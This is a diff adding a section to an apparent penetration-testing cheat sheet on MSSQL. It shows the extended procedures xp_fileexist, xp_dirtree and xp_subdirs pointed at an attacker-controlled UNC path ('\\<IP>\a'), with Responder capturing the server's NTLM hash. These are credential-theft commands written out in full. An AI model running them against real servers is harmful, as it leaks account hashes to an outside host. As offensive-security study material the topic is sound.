@@ -37,3 +37,25 @@ In order to capture said hash, we need to make use of certain undocumented exten
 xp_fileexist : Checks whether a certain file exists
 xp_dirtree : Returns a directory tree based on a provided directory
 xp_subdirs : Returns a list of sub-directories of a provided director
+
+as an example:
+```powershell
+EXEC xp_fileexist 'C:\Windows\System32\drivers\etc\hosts';
+
+File Exists   File is a Directory   Parent Directory Exists
+-----------   -------------------   -----------------------
+          1                     0                         1
+
+```
+
+so we can use something like:
+```powershell
+EXEC xp_dirtree '\\<IP>\a';
+EXEC xp_subdirs '\\<IP>\a';
+EXEC xp_fileexist '\\<IP>\a';
+```
+with responder to capture NTLM hash.
+
+---
+
+## Command Execution
